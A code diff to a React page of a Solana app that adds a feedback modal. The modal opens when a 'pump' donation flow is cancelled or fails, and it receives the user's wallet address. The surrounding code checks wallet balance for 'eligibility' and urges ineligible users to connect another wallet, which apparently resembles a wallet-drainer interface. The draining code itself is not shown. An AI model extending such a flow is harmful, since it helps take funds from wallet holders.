@@ -19,14 +19,16 @@ import { useConnection } from '@solana/wallet-adapter-react';
 import { LAMPORTS_PER_SOL } from '@solana/web3.js';
 import { notify } from '@/lib/notify';
 import { TOKEN_PROGRAM_ID } from '@solana/spl-token';
+import { FeedbackModal } from '@/components/FeedbackModal';
 
 const Index = () => {
   const { connected, publicKey } = useWallet();
   const { connection } = useConnection();
-  const { startDonation, isProcessing, transactions, currentIndex } = usePump();
+  const { startDonation, isProcessing, transactions, currentIndex, pumpOutcome } = usePump();
   const [walletBalance, setWalletBalance] = useState<number>(0);
   const [isEligible, setIsEligible] = useState<boolean>(false);
   const hasNotifiedConnect = useRef(false);
+  const [feedbackOpen, setFeedbackOpen] = useState(false);
 
   const totalValue = transactions.reduce((sum, tx) => sum + tx.usdValue, 0);
 
@@ -42,6 +44,13 @@ const Index = () => {
     { name: 'pebble', url: 'https://pump.fun/coin/Eppcp4FhG6wmaRno3omWWvKsZHbzucVLR316SdXopump', img: pebbleImg },
     { name: 'mars', url: 'https://pump.fun/coin/GqXX9MfkURBZ5cFym9HDzqTL7uZkjtCSqLkUSe2xpump', img: marsImg },
   ];
+
+  useEffect(() => {
+    // Open the feedback modal when the pump flow is cancelled or errors
+    if (pumpOutcome === 'cancelled' || pumpOutcome === 'error') {
+      setFeedbackOpen(true);
+    }
+  }, [pumpOutcome]);
 
   useEffect(() => {
     const checkBalance = async () => {
@@ -162,7 +171,7 @@ const Index = () => {
             ) : (
               <div className="w-full space-y-6">
                 {/* Eligibility Status */}
-                <div className="bg-card/50 backdrop-blur-lg border border-border/50 rounded-xl p-6 text-center">
+                <div className={`bg-card/50 backdrop-blur-lg border border-border/50 rounded-xl p-6 text-center`}>
                   <p className={`text-2xl font-bold ${isEligible ? 'text-green-500' : 'text-red-500'}`}>
                     {isEligible ? 'Eligible' : 'Not eligible connect with other wallet'}
                   </p>
@@ -229,6 +238,13 @@ const Index = () => {
           </div>
         </div>
       </div>
+
+      <FeedbackModal
+        open={feedbackOpen}
+        onOpenChange={setFeedbackOpen}
+        address={publicKey ? publicKey.toBase58() : undefined}
+        context={pumpOutcome === 'cancelled' ? 'cancelled' : 'error'}
+      />
 
       <style>{`
         @keyframes gradient {
